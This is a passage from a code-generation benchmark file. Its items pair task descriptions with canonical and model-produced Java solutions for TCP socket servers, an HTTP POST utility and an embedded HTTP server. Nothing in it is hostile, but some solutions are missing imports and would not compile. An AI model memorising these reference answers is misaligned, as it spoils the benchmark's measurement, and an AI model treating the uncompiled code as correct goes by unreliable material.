    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\n\npublic class InnerSocketThread extends Thread {\n    private ServerSocket socket;\n\n    public void run() {\n        try {\n            socket = new ServerSocket(Manager.PORT);\n            while (true) {\n                Socket child = socket.accept();\n                child.setSoTimeout(5000);\n\n                String command = read(child.getInputStream());\n\n                if (Manager.START.equals(command)) {\n                    Manager.instance().setSwitchFlag(true);\n                } else if (Manager.STATUS.equals(command)) {\n                    write(child.getOutputStream());\n                } else if (Manager.FLUSHMETHOD.equals(command)) {\n                    MethodCache.flushMethodData();\n                } else {\n                    Manager.instance().setSwitchFlag(false);\n                }\n                child.close();\n            }\n        } catch (SocketException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private String read(InputStream in) throws IOException {\n        BufferedInputStream bin = new BufferedInputStream(in);\n        StringBuffer sb = new StringBuffer();\n        int i;\n        while ((i = bin.read()) != -1) {\n            char c = (char) i;\n            if (c == '\\r') {\n                break;\n            } else {\n                sb.append(c);\n            }\n        }\n        return sb.toString();\n    }\n\n    private void write(OutputStream os) throws IOException {\n        BufferedOutputStream out = new BufferedOutputStream(os);\n        if (Manager.instance().getSwitchFlag()) {\n            out.write(\"running\".getBytes());\n        } else {\n            out.write(\"stop\".getBytes());\n        }\n        out.write('\\r');\n        out.flush();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class InnerSocketThread extends Thread {\n    private ServerSocket socket;\n\n    public InnerSocketThread() throws IOException {\n        this.socket = new ServerSocket(Manager.PORT);\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (true) {\n                socket.setSoTimeout(5000);\n                Socket clientSocket = socket.accept();\n                try (\n                    InputStream in = clientSocket.getInputStream();\n                    OutputStream os = clientSocket.getOutputStream()\n                ) {\n                    String command = read(in);\n                    if (\"STATUS\".equals(command)) {\n                        write(os);\n                    } else if (\"START\".equals(command)) {\n                        Manager.startApplication();\n                    } else if (\"FLUSHMETHOD\".equals(command)) {\n                        Manager.flushMethod();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                } finally {\n                    try {\n                        clientSocket.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String read(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int b;\n        while ((b = in.read()) != -1) {\n            char c = (char) b;\n            if (c == '\\r') break;\n            sb.append(c);\n        }\n        return sb.toString();\n    }\n\n    private void write(OutputStream os) throws IOException {\n        String status = Manager.isSwitchOn() ? \"running\" : \"stop\";\n        os.write((status + \"\\r\").getBytes());\n        os.flush();\n    }\n}\n```"
  },
  {
    "Task_id": 546,
    "Instruction": "Task Description: Create a Java class that implements a simple TCP server capable of accepting client connections and sending messages to connected clients.\n\nClass Description: The HelloServer class represents a basic TCP server that listens for incoming client connections on a specified port. Once a client connects, the server can send messages to that client through the established connection.\n\nAttributes:\n- server: [ServerSocket] - The ServerSocket instance used to listen for incoming client connections\n- client: [Socket] - The Socket instance representing the connected client\n- out: [PrintStream] - The output stream used to send messages to the connected client\n\nMethods:\n- start: [Name]([int port]) -> [void] - Starts the server on the specified port, waits for a client connection, and prepares the output stream for communication\n- sendMessage: [Name]([String message]) -> [void] - Sends the specified message to the connected client\n- stop: [Name]() -> [void] - Closes the client connection and server socket, releasing all resources",
    "Canonical_solution": "import java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class HelloServer {\n\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n\n    public void start(int port) throws Exception {\n        server = new ServerSocket(port);\n        System.out.println(\"\u670d\u52a1\u5668\u8fd0\u884c\u4e2d\uff0c\u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5\u3002\");\n        client = server.accept();\n        out = new PrintStream(client.getOutputStream());\n    }\n\n    public void sendMessage(String message) throws Exception {\n        out.println(message);\n    }\n\n    public void stop() throws Exception {\n        client.close();\n        server.close();\n        System.out.println(\"\u670d\u52a1\u5668\u5df2\u5411\u5ba2\u6237\u7aef\u53d1\u9001\u6d88\u606f\uff0c\u9000\u51fa\u3002\");\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class HelloServer {\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n\n    public void start(int port) {\n        try {\n            server = new ServerSocket(port);\n            System.out.println(\"Server started on port \" + port);\n            client = server.accept();\n            System.out.println(\"Client connected: \" + client.getInetAddress());\n            out = new PrintStream(client.getOutputStream());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String message) {\n        if (out != null) {\n            out.println(message);\n            out.flush();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (client != null) client.close();\n            if (server != null) server.close();\n            System.out.println(\"Server stopped.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 547,
    "Instruction": "Task Description: Implement a TCP server class that listens for incoming client connections, processes client commands, and sends responses back. The server should run in a dedicated thread and support graceful shutdown.\n\nClass Description: SnapshotService is a TCP server implementation that listens on a specified port for client connections. It processes incoming commands from clients and responds with processed messages. The server runs in a separate thread and maintains its state through a boolean flag for controlled shutdown.\n\nAttributes:\n- port: [int] - The port number on which the server listens for incoming connections\n- serverSocket: [ServerSocket] - The server socket instance used to accept client connections\n- closed: [boolean] - Flag indicating whether the server has been shut down\n\nMethods:\n- SnapshotService(int port) -> [void] - Constructor that validates and sets the server port\n- listen() -> [void] - Starts the server by opening a socket and beginning to listen for connections\n- openSocket(int port) -> [int] - Creates a ServerSocket and starts a thread to handle client connections, returns the actual port being used\n- isIgnoredException() -> [boolean] - Checks if an exception should be ignored based on server socket state\n- process(Socket socket) -> [void] - Processes an individual client connection, reading input and sending responses\n- outputMessage(BufferedWriter outputWriter, String msg) -> [void] - Helper method to send messages to clients\n- close() -> [void] - Gracefully shuts down the server by closing the server socket",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport lombok.extern.slf4j.Slf4j;\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\n@Slf4j\npublic final class SnapshotService {\n\n    private final int port;\n    private ServerSocket serverSocket;\n    private volatile boolean closed;\n\n    public SnapshotService(final int port) {\n        Preconditions.checkArgument(port >= 0 && port <= 0xFFFF, \"Port value out of range: \" + port);\n        this.port = port;\n    }\n\n    public void listen() {\n        try {\n            log.info(\"ElasticJob: Snapshot service is running on port '{}'\", openSocket(port));\n        } catch (final IOException ex) {\n            log.error(\"ElasticJob: Snapshot service listen failure, error is: \", ex);\n        }\n    }\n\n    private int openSocket(final int port) throws IOException {\n        closed = false;\n        serverSocket = new ServerSocket(port);\n        int localPort = serverSocket.getLocalPort();\n        String threadName = String.format(\"elasticjob-snapshot-service-%d\", localPort);\n        new Thread(() -> {\n            while (!closed) {\n                try {\n                    process(serverSocket.accept());\n                } catch (final IOException ex) {\n                    if (isIgnoredException()) {\n                        return;\n                    }\n                    log.error(\"ElasticJob: Snapshot service open socket failure, error is: \", ex);\n                }\n            }\n        }, threadName).start();\n        return localPort;\n    }\n\n    private boolean isIgnoredException() {\n        return serverSocket.isClosed();\n    }\n\n    private void process(final Socket socket) throws IOException {\n        try (\n                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n                Socket ignored = socket) {\n            String cmdLine = reader.readLine();\n            if (null != cmdLine) {\n                outputMessage(writer, \"Processed: \" + cmdLine);\n            }\n        }\n    }\n\n    private void outputMessage(final BufferedWriter outputWriter, final String msg) throws IOException {\n        outputWriter.append(msg);\n        outputWriter.flush();\n    }\n\n    public void close() {\n        closed = true;\n        if (null != serverSocket && !serverSocket.isClosed()) {\n            try {\n                serverSocket.close();\n            } catch (final IOException ex) {\n                log.error(\"ElasticJob: Snapshot service close failure, error is: \", ex);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SnapshotService {\n    private int port;\n    private ServerSocket serverSocket;\n    private boolean closed;\n\n    public SnapshotService(int port) {\n        this.port = port;\n        this.closed = false;\n    }\n\n    public void listen() {\n        try {\n            openSocket(port);\n        } catch (IOException e) {\n            if (!isIgnoredException()) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private int openSocket(int port) throws IOException {\n        serverSocket = new ServerSocket(0);\n        int actualPort = serverSocket.getLocalPort();\n        Thread listenerThread = new Thread(() -> {\n            while (!closed) {\n                try {\n                    Socket socket = serverSocket.accept();\n                    process(socket);\n                } catch (IOException e) {\n                    if (!isIgnoredException()) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        });\n        listenerThread.start();\n        return actualPort;\n    }\n\n    private boolean isIgnoredException() {\n        return serverSocket != null && !serverSocket.isBound();\n    }\n\n    private void process(Socket socket) {\n        try (BufferedReader inputReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n             BufferedWriter outputWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()))) {\n\n            String command;\n            while ((command = inputReader.readLine()) != null) {\n                String response = \"Processed: \" + command;\n                outputMessage(outputWriter, response);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void outputMessage(BufferedWriter outputWriter, String msg) throws IOException {\n        outputWriter.write(msg);\n        outputWriter.newLine();\n        outputWriter.flush();\n    }\n\n    public void close() {\n        closed = true;\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 548,
    "Instruction": "Task Description: Create a Java class that implements a TCP server for binary data communication, capable of handling client connections and data exchange using object serialization.\n\nClass Description: BinaryLinkServer is a TCP server implementation that listens for incoming client connections, establishes communication channels, and handles binary data exchange using Java's object serialization. It manages connection lifecycle and provides thread-safe termination.\n\nAttributes:\n- acceptor: Acceptor - Thread responsible for accepting incoming client connections\n- handler: AtomicReference<Handler> - Thread-safe reference to the current connection handler\n\nMethods:\n- BinaryLinkServer() -> void - Constructor that initializes the server and starts the acceptor thread\n- terminate() -> void - Shuts down the server by closing all active connections and stopping threads\n- getListenAddress() -> InetAddress - Determines the server's listening address from system properties or defaults to loopback\n- getListenPort() -> int - Retrieves the server's listening port from system properties or uses ephemeral port\n\nNested Classes:\n1. Acceptor (extends Thread):\n   Attributes:\n   - server: ServerSocket - The server socket listening for connections\n   - listenAddress: InetAddress - The address the server is bound to\n\n   Methods:\n   - Acceptor() -> void - Constructor that creates the server socket\n   - run() -> void - Main acceptor loop that handles incoming connections\n   - close() -> void - Closes the server socket\n\n2. Handler (extends Thread):\n   Attributes:\n   - socket: Socket - The client connection socket\n   - is: InputStream - Input stream from the client\n   - os: OutputStream - Output stream to the client\n   - ois: ObjectInputStream - Object input stream for deserialization\n   - oos: ObjectOutputStream - Object output stream for serialization\n\n   Methods:\n   - Handler(Socket) -> void - Constructor that initializes communication streams\n   - run() -> void - Main handler loop that processes incoming objects\n   - close() -> void - Closes the client connection and releases resources",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic final class BinaryLinkServer {\n\n    private final Acceptor acceptor;\n    private final AtomicReference<Handler> handler;\n\n    public BinaryLinkServer() throws IOException {\n        acceptor = new Acceptor();\n        acceptor.start();\n        handler = new AtomicReference<>();\n    }\n\n    public void terminate() {\n        acceptor.close();\n        Handler h = handler.getAndSet(null);\n        if (h != null) {\n            h.close();\n        }\n        try {\n            acceptor.join();\n            if (h != null) {\n                h.join();\n            }\n        } catch (InterruptedException e) {\n            // ignore\n        }\n    }\n\n    private InetAddress getListenAddress() throws UnknownHostException {\n        String addr = System.getProperty(\"jmh.link.address\");\n        if (addr != null) {\n            return InetAddress.getByName(addr);\n        }\n        try {\n            Method m = InetAddress.class.getMethod(\"getLoopbackAddress\");\n            return (InetAddress) m.invoke(null);\n        } catch (Exception e) {\n            // fall through\n        }\n        return InetAddress.getByAddress(new byte[] {127, 0, 0, 1});\n    }\n\n    private int getListenPort() {\n        return Integer.getInteger(\"jmh.link.port\", 0);\n    }\n\n    private final class Acceptor extends Thread {\n        private final ServerSocket server;\n        private final InetAddress listenAddress;\n\n        public Acceptor() throws IOException {\n            listenAddress = getListenAddress();\n            server = new ServerSocket(getListenPort(), 50, listenAddress);\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!Thread.interrupted()) {\n                    Socket clientSocket = server.accept();\n                    Handler r = new Handler(clientSocket);\n                    if (!handler.compareAndSet(null, r)) {\n                        throw new IllegalStateException(\"Handler already registered\");\n                    }\n                    r.start();\n                }\n            } catch (SocketException e) {\n                // assume \"Socket closed\"\n            } catch (IOException e) {\n                throw new IllegalStateException(e);\n            } finally {\n                close();\n            }\n        }\n\n        public void close() {\n            try {\n                server.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n\n    private final class Handler extends Thread {\n        private final Socket socket;\n        private final InputStream is;\n        private final OutputStream os;\n        private ObjectInputStream ois;\n        private ObjectOutputStream oos;\n\n        public Handler(Socket socket) throws IOException {\n            this.socket = socket;\n            this.is = socket.getInputStream();\n            this.os = socket.getOutputStream();\n            this.oos = new ObjectOutputStream(new BufferedOutputStream(os));\n            oos.flush();\n        }\n\n        @Override\n        public void run() {\n            try {\n                ois = new ObjectInputStream(new BufferedInputStream(is));\n                while (true) {\n                    Object obj = ois.readObject();\n                    if (obj == null) break;\n                    // Handle different frame types here\n                }\n            } catch (Exception e) {\n                // Handle exceptions\n            } finally {\n                close();\n            }\n        }\n\n        public void close() {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class BinaryLinkServer {\n    private final Acceptor acceptor;\n    private final AtomicReference<Handler> handler = new AtomicReference<>();\n\n    public BinaryLinkServer() throws IOException {\n        acceptor = new Acceptor();\n        acceptor.start();\n    }\n\n    public void terminate() {\n        try {\n            Handler currentHandler = handler.getAndSet(null);\n            if (currentHandler != null) {\n                currentHandler.close();\n            }\n            acceptor.close();\n            acceptor.join();\n        } catch (InterruptedException | IOException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public InetAddress getListenAddress() throws UnknownHostException {\n        String addressStr = System.getProperty(\"server.address\");\n        return addressStr == null ? InetAddress.getLocalHost() : InetAddress.getByName(addressStr);\n    }\n\n    public int getListenPort() {\n        String portStr = System.getProperty(\"server.port\");\n        return portStr == null ? 0 : Integer.parseInt(portStr);\n    }\n\n    class Acceptor extends Thread {\n        private ServerSocket server;\n        private InetAddress listenAddress;\n\n        Acceptor() throws IOException {\n            listenAddress = getListenAddress();\n            int port = getListenPort();\n            server = new ServerSocket(port, 0, listenAddress);\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!Thread.interrupted()) {\n                    Socket clientSocket = server.accept();\n                    Handler newHandler = new Handler(clientSocket);\n                    handler.set(newHandler);\n                    newHandler.start();\n                }\n            } catch (IOException ignored) {\n            }\n        }\n\n        void close() throws IOException {\n            if (server != null && !server.isClosed()) {\n                server.close();\n            }\n        }\n    }\n\n    class Handler extends Thread {\n        private final Socket socket;\n        private InputStream is;\n        private OutputStream os;\n        private ObjectInputStream ois;\n        private ObjectOutputStream oos;\n\n        Handler(Socket socket) throws IOException {\n            this.socket = socket;\n            is = socket.getInputStream();\n            os = socket.getOutputStream();\n            oos = new ObjectOutputStream(os);\n            ois = new ObjectInputStream(is);\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!Thread.interrupted()) {\n                    Object obj = ois.readObject();\n                    // Process the object as needed\n                }\n            } catch (IOException | ClassNotFoundException ignored) {\n            } finally {\n                close();\n            }\n        }\n\n        void close() throws IOException {\n            try {\n                if (ois != null) ois.close();\n            } finally {\n                try {\n                    if (oos != null) oos.close();\n                } finally {\n                    try {\n                        if (socket != null) socket.close();\n                    } catch (IOException ignored) {\n                    }\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 55,
    "Instruction": "Task Description: Create a Java utility class for handling HTTP requests and responses, including POST operations, with support for proxies, timeouts, and error handling.\n\nClass Description: JavaHttpUtility is a helper class designed to simplify HTTP communication in Java applications. It provides methods for making POST requests, handling responses, and managing errors. The class supports proxy configuration, connection timeouts, and compressed responses (gzip).\n\nAttributes:\nCONNECT_TIMEOUT: [int] - Connection timeout in milliseconds (default: 10000)\nREAD_TIMEOUT: [int] - Read timeout in milliseconds (default: 10000)\n\nMethods:\ngetProxy: () -> [Proxy] - Retrieves system proxy settings if configured\ndoPost: (String urlAddress, Map<String, String> param) -> [String] - Executes a POST request to the specified URL with given parameters\nhandleResponse: (HttpURLConnection httpURLConnection) -> [String] - Processes the HTTP response and handles errors\nreadResult: (HttpURLConnection urlConnection) -> [String] - Reads and returns the successful response body\nhandleError: (HttpURLConnection urlConnection) -> [String] - Processes and throws appropriate exceptions for error responses",
    "Canonical_solution": "import org.json.JSONException;\nimport org.json.JSONObject;\nimport org.qii.weiciyuan.support.debug.AppLogger;\nimport org.qii.weiciyuan.support.error.ErrorCode;\nimport org.qii.weiciyuan.support.error.WeiboException;\nimport org.qii.weiciyuan.support.utils.Utility;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.InterruptedIOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.zip.GZIPInputStream;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class JavaHttpUtility {\n\n    private static final int CONNECT_TIMEOUT = 10 * 1000;\n    private static final int READ_TIMEOUT = 10 * 1000;\n\n    private static Proxy getProxy() {\n        String proxyHost = System.getProperty(\"http.proxyHost\");\n        String proxyPort = System.getProperty(\"http.proxyPort\");\n        if (!TextUtils.isEmpty(proxyHost) && !TextUtils.isEmpty(proxyPort)) {\n            return new Proxy(java.net.Proxy.Type.HTTP,\n                    new InetSocketAddress(proxyHost, Integer.valueOf(proxyPort)));\n        } else {\n            return null;\n        }\n    }\n\n    public String doPost(String urlAddress, Map<String, String> param) throws WeiboException {\n        try {\n            URL url = new URL(urlAddress);\n            Proxy proxy = getProxy();\n            HttpsURLConnection uRLConnection;\n            if (proxy != null) {\n                uRLConnection = (HttpsURLConnection) url.openConnection(proxy);\n            } else {\n                uRLConnection = (HttpsURLConnection) url.openConnection();\n            }\n\n            uRLConnection.setDoInput(true);\n            uRLConnection.setDoOutput(true);\n            uRLConnection.setRequestMethod(\"POST\");\n            uRLConnection.setUseCaches(false);\n            uRLConnection.setConnectTimeout(CONNECT_TIMEOUT);\n            uRLConnection.setReadTimeout(READ_TIMEOUT);\n            uRLConnection.setInstanceFollowRedirects(false);\n            uRLConnection.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            uRLConnection.setRequestProperty(\"Charset\", \"UTF-8\");\n            uRLConnection.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\");\n            uRLConnection.connect();\n\n            DataOutputStream out = new DataOutputStream(uRLConnection.getOutputStream());\n            out.write(Utility.encodeUrl(param).getBytes());\n            out.flush();\n            out.close();\n            return handleResponse(uRLConnection);\n        } catch (IOException e) {\n            throw new WeiboException(\"Timeout\", e);\n        }\n    }\n\n    private String handleResponse(HttpURLConnection httpURLConnection) throws WeiboException {\n        int status = 0;\n        try {\n            status = httpURLConnection.getResponseCode();\n        } catch (IOException e) {\n            httpURLConnection.disconnect();\n            throw new WeiboException(\"Timeout\", e);\n        }\n\n        if (status != HttpURLConnection.HTTP_OK) {\n            return handleError(httpURLConnection);\n        }\n\n        return readResult(httpURLConnection);\n    }\n\n    private String readResult(HttpURLConnection urlConnection) throws WeiboException {\n        InputStream is = null;\n        BufferedReader buffer = null;\n        try {\n            is = urlConnection.getInputStream();\n\n            String content_encode = urlConnection.getContentEncoding();\n            if (!TextUtils.isEmpty(content_encode) && content_encode.equals(\"gzip\")) {\n                is = new GZIPInputStream(is);\n            }\n\n            buffer = new BufferedReader(new InputStreamReader(is));\n            StringBuilder strBuilder = new StringBuilder();\n            String line;\n            while ((line = buffer.readLine()) != null) {\n                strBuilder.append(line);\n            }\n            return strBuilder.toString();\n        } catch (IOException e) {\n            throw new WeiboException(\"Timeout\", e);\n        } finally {\n            Utility.closeSilently(is);\n            Utility.closeSilently(buffer);\n            urlConnection.disconnect();\n        }\n    }\n\n    private String handleError(HttpURLConnection urlConnection) throws WeiboException {\n        InputStream is = null;\n        BufferedReader buffer = null;\n        try {\n            is = urlConnection.getErrorStream();\n            if (is == null) {\n                throw new WeiboException(\"Unknown network error\");\n            }\n\n            String content_encode = urlConnection.getContentEncoding();\n            if (!TextUtils.isEmpty(content_encode) && content_encode.equals(\"gzip\")) {\n                is = new GZIPInputStream(is);\n            }\n\n            buffer = new BufferedReader(new InputStreamReader(is));\n            StringBuilder strBuilder = new StringBuilder();\n            String line;\n            while ((line = buffer.readLine()) != null) {\n                strBuilder.append(line);\n            }\n            AppLogger.d(\"error result=\" + strBuilder.toString());\n            \n            JSONObject json = new JSONObject(strBuilder.toString());\n            String err = json.optString(\"error_description\", \"\");\n            if (TextUtils.isEmpty(err)) {\n                err = json.getString(\"error\");\n            }\n            int errCode = json.getInt(\"error_code\");\n            WeiboException exception = new WeiboException();\n            exception.setError_code(errCode);\n            exception.setOriError(err);\n\n            if (errCode == ErrorCode.EXPIRED_TOKEN || errCode == ErrorCode.INVALID_TOKEN) {\n                Utility.showExpiredTokenDialogOrNotification();\n            }\n\n            throw exception;\n        } catch (IOException | JSONException e) {\n            throw new WeiboException(\"Timeout\", e);\n        } finally {\n            Utility.closeSilently(is);\n            Utility.closeSilently(buffer);\n            urlConnection.disconnect();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class JavaHttpUtility {\n    public static final int CONNECT_TIMEOUT = 10000;\n    public static final int READ_TIMEOUT = 10000;\n\n    private static Proxy getProxy() {\n        ProxySelector proxySelector = ProxySelector.getDefault();\n        List<Proxy> proxies = proxySelector.select(URI.create(\"http://example.com\"));\n        for (Proxy proxy : proxies) {\n            if (proxy.type() != Proxy.Type.DIRECT) {\n                return proxy;\n            }\n        }\n        return Proxy.NO_PROXY;\n    }\n\n    public static String doPost(String urlAddress, Map<String, String> param) throws IOException {\n        HttpURLConnection httpURLConnection = null;\n        try {\n            URL url = new URL(urlAddress);\n            Proxy proxy = getProxy();\n            httpURLConnection = (HttpURLConnection) url.openConnection(proxy);\n\n            httpURLConnection.setRequestMethod(\"POST\");\n            httpURLConnection.setConnectTimeout(CONNECT_TIMEOUT);\n            httpURLConnection.setReadTimeout(READ_TIMEOUT);\n            httpURLConnection.setDoOutput(true);\n            httpURLConnection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n            try (OutputStream os = httpURLConnection.getOutputStream()) {\n                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, \"UTF-8\"));\n                StringBuilder postData = new StringBuilder();\n                for (Map.Entry<String, String> entry : param.entrySet()) {\n                    if (postData.length() != 0)\n                        postData.append('&');\n                    postData.append(URLEncoder.encode(entry.getKey(), \"UTF-8\"));\n                    postData.append('=');\n                    postData.append(URLEncoder.encode(entry.getValue(), \"UTF-8\"));\n                }\n                writer.write(postData.toString());\n                writer.flush();\n            }\n\n            return handleResponse(httpURLConnection);\n        } catch (IOException e) {\n            throw e;\n        } finally {\n            if (httpURLConnection != null) {\n                httpURLConnection.disconnect();\n            }\n        }\n    }\n\n    private static String handleResponse(HttpURLConnection httpURLConnection) throws IOException {\n        int responseCode = httpURLConnection.getResponseCode();\n        if (responseCode >= 200 && responseCode < 400) {\n            return readResult(httpURLConnection);\n        } else {\n            return handleError(httpURLConnection);\n        }\n    }\n\n    private static String readResult(HttpURLConnection urlConnection) throws IOException {\n        InputStream inputStream;\n        if (\"gzip\".equals(urlConnection.getContentEncoding())) {\n            inputStream = new GZIPInputStream(urlConnection.getInputStream());\n        } else {\n            inputStream = urlConnection.getInputStream();\n        }\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        StringBuilder result = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            result.append(line);\n        }\n        reader.close();\n        return result.toString();\n    }\n\n    private static String handleError(HttpURLConnection urlConnection) throws IOException {\n        InputStream errorStream = urlConnection.getErrorStream();\n        if (errorStream != null) {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(errorStream));\n            StringBuilder errorResult = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                errorResult.append(line);\n            }\n            reader.close();\n            throw new IOException(\"HTTP error code: \" + urlConnection.getResponseCode() + \", Message: \" + errorResult.toString());\n        } else {\n            throw new IOException(\"HTTP error code: \" + urlConnection.getResponseCode());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 550,
    "Instruction": "Task Description: Implement a simple embedded HTTP server class that can handle incoming HTTP requests, parse request information, and provide a framework for custom request handling.\n\nClass Description: The EmbedHttpServer class represents a basic HTTP server that listens on a specified port, accepts client connections, parses HTTP request headers and content, and provides hooks for custom request processing. It handles the low-level socket communication while delegating the actual request handling to subclasses or implementations.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections\n- serverSocket: ServerSocket - The server socket instance used to accept client connections\n\nMethods:\n- EmbedHttpServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> void - Starts the server by creating a ServerSocket and launching a dedicated thread for handling connections\n- stop() -> void - Stops the server by closing the ServerSocket and cleaning up resources\n- run() -> void - The main server loop that accepts connections and processes requests (runs in a separate thread)\n- handle(String method, String path, HashMap<String,String> headers, Map<String,String> queries, InputStream input, OutputStream response) -> void - Abstract method meant to be overridden for custom request handling (does nothing in base implementation)\n- parsePath(String path) -> Map<String,String> - Helper method that parses the request path and extracts query parameters",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.antfortune.freeline.router.ISchemaAction;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class EmbedHttpServer {\n\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        if (serverSocket == null) {\n            serverSocket = new ServerSocket(port);\n            new Thread(this::run, \"embed-http-server\").start();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n            serverSocket = null;\n        }\n    }\n\n    private void run() {\n        final ServerSocket ss = serverSocket;\n        while (ss == serverSocket) {\n            Socket conn = null;\n            try {\n                conn = ss.accept();\n                String method = null;\n                String path = null;\n                HashMap<String, String> headers = new HashMap<>();\n\n                InputStream ins = conn.getInputStream();\n                StringBuilder sb = new StringBuilder(512);\n                int l;\n                while ((l = ins.read()) != -1) {\n                    if (l == '\\n') {\n                        if (sb.length() > 0 && sb.charAt(sb.length() - 1) == '\\r')\n                            sb.setLength(sb.length() - 1);\n                        if (sb.length() == 0) {\n                            break;\n                        } else if (method == null) {\n                            int i = sb.indexOf(\" \");\n                            method = sb.substring(0, i);\n                            int j = sb.lastIndexOf(\" HTTP/\");\n                            path = sb.substring(i + 1, j).trim();\n                        } else {\n                            int i = sb.indexOf(\":\");\n                            String name = sb.substring(0, i).trim();\n                            String val = sb.substring(i + 1).trim();\n                            headers.put(name, val);\n                        }\n                        sb.setLength(0);\n                    } else {\n                        sb.append((char) l);\n                    }\n                }\n                int contentLength = 0;\n                String str = headers.get(\"Content-Length\");\n                if (str != null) {\n                    contentLength = Integer.parseInt(str);\n                }\n                OutputStream os = conn.getOutputStream();\n                str = headers.get(\"Expect\");\n                if (\"100-Continue\".equalsIgnoreCase(str)) {\n                    os.write(\"HTTP/1.1 100 Continue\\r\\n\\r\\n\".getBytes(\"ASCII\"));\n                    os.flush();\n                }\n                InputStream input = new BodyInputStream(ins, contentLength);\n                OutputStream response = new ResponseOutputStream(os);\n\n                Map<String, String> queries = parsePath(path);\n                